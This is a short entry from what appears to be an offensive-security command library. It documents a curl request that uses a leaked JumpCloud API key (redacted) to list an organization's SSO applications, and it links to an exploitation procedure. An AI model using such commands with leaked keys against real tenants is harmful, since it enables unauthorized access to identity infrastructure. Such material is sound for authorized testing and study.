---
data: 'curl -H "x-api-key: ██████" "https://console.jumpcloud.com/api/applications"'
tags:
  - api
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c79cf6b0-ad59-4d8e-9787-45da9435d52d
created_at: '2025-12-11T06:10:28.751Z'
updated_at: '2025-12-11T06:10:28.751Z'
verified: false
validated: true
submitted: true
---
# curl-jumpcloud-applications

## Command

```bash
curl -H "x-api-key: ██████" "https://console.jumpcloud.com/api/applications"
```

## Description

This command uses curl to send a GET request to the JumpCloud applications endpoint, authenticating with a leaked API key to list SSO applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "x-api-key: ██████"` | Adds the API key header for authentication | Yes |
| `"https://console.jumpcloud.com/api/applications"` | The endpoint to retrieve SSO application information | Yes |

## Examples

### Basic Usage

```bash
curl -H "x-api-key: ██████" "https://console.jumpcloud.com/api/applications"
```

### Advanced Usage

```bash
curl -H "x-api-key: ██████" "https://console.jumpcloud.com/api/applications" -o apps.json
```

## Expected Output

A JSON response containing a list of SSO applications, if the key is valid.

## Related

- [[commands/curl-jumpcloud-systems]]
- [[procedures/Exploit-Leaked-JumpCloud-API-Key-to-Access-Internal-Resources]]
